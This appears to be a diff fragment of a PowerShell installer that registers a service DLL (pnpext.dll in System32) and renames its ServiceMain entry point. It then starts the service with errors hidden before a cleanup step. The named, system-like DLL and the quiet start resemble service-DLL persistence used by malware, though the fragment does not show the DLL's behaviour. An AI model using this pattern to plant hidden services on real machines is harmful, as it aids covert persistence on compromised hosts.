@@ -63,7 +63,7 @@ Write-Host "[6/7] Configuring ServiceDll..." -ForegroundColor Cyan
 $paramPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC\Parameters"
 New-Item $paramPath -Force|Out-Null
 New-ItemProperty $paramPath -Name "ServiceDll" -Value "$SYS32\pnpext.dll" -PropertyType ExpandString -Force|Out-Null
-New-ItemProperty $paramPath -Name "ServiceMain" -Value "ServiceMain" -PropertyType String -Force|Out-Null
+New-ItemProperty $paramPath -Name "ServiceMain" -Value "PnpServiceEntry" -PropertyType String -Force|Out-Null
 
 Write-Host "[7/7] Starting + cleanup..." -ForegroundColor Cyan
 sc.exe start $SVC 2>$null|Out-Null; Start-Sleep 5
